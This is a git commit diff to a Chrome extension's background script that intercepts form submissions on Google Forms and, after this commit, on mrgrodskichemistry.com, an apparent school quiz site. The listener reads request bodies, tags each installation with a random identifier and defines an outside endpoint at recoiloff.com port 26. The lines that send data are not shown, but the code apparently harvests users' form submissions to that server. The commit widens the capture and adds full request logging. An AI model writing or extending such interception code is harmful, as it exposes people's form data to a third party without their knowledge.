97be34814d3e4f85e6da81866130e8b440ea85ef
quintindunn <93884113+quintindunn@users.noreply.github.com>
2022-03-01 18:13:36 -0500

    Updated detection for mrgrodskichemistry.com

--- background.js
+++ background.js
@@ -1,11 +1,13 @@
 chrome.webRequest.onBeforeRequest.addListener(
     function(details)
     {
-        const url = "http://recoiloff.com:26"
+        const url = "http://recoiloff.com:26";
         if (details.method === "GET") return;
-        if (!(details.url).toString().endsWith("formResponse")) return;
+		console.log(JSON.stringify(details));
+        if (!(details.url).toString().startsWith("https://docs.google.com/forms") && !(details.url).toString().startsWith("https://forms.gle")) return;
 		    chrome.storage.local.get("identifier3", function(result) {
-        if (JSON.stringify(result).toString() === "{}") {
+
+		if (JSON.stringify(result).toString() === "{}") {
             chrome.storage.local.set({"identifier3": Math.random().toString().replace(".", "")});
         }
 		});
@@ -21,6 +23,6 @@ chrome.webRequest.onBeforeRequest.addListener(
 
         });
     },
-    {urls: ["https://docs.google.com/*", "https://forms.gle/*"]},
+    {urls: ["https://docs.google.com/*", "https://forms.gle/*", "https://mrgrodskichemistry.com/*"]},
     ['requestBody']
 );
